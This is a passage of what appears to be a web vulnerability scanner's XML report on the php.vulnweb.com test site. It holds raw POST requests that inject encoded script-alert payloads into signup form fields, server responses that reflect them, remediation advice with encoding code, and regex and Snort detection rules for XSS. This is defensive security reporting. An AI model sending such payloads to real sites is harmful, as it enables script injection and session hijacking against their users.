X-Scan-Memo: Category="Audit.Attack";SID="7570325A6879014F9BFFBC41D6B89C31";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="ucc";AttackParamIndex="4";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2537%2533%2532%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="e1d21a2d";
X-Request-Memo: ID="144632a8";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%37%33%32%37%29%3c%2f%73%43%72%49%70%54%3e&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="949" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="7570325A6879014F9BFFBC41D6B89C31"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="7570325A6879014F9BFFBC41D6B89C31";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="ucc";AttackParamIndex="4";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2537%2533%2532%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="e1d21a2d";
X-Request-Memo: ID="144632a8";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%37%33%32%37%29%3c%2f%73%43%72%49%70%54%3e&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:52:54 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 811

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345<sCrIpT>alert(47327)</sCrIpT></li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></RawResponse><Request id="7570325A6879014F9BFFBC41D6B89C31"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%37%33%32%37%29%3c%2f%73%43%72%49%70%54%3e&amp;uemail=John.Doe%40somewhere.com&amp;uphone=770&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>242</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="7570325A6879014F9BFFBC41D6B89C31";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="ucc";AttackParamIndex="4";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2537%2533%2532%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="e1d21a2d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="144632a8";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345<sCrIpT>alert(47327)</sCrIpT></li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:52:54 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>811</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="DE30DF538438A1200688B1CFCA1F594F"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>uemail</AttackParamDescriptor><Issues><Issue id="793901c0-d230-48b5-93e6-27532cb3b639"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="DE30DF538438A1200688B1CFCA1F594F";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uemail";AttackParamIndex="5";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="John.Doe%2540somewhere.com%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2533%2534%2531%2537%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="fa9f6234";
X-Request-Memo: ID="85a7fcb1";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%33%34%31%37%31%29%3c%2f%73%43%72%49%70%54%3e&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="896" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
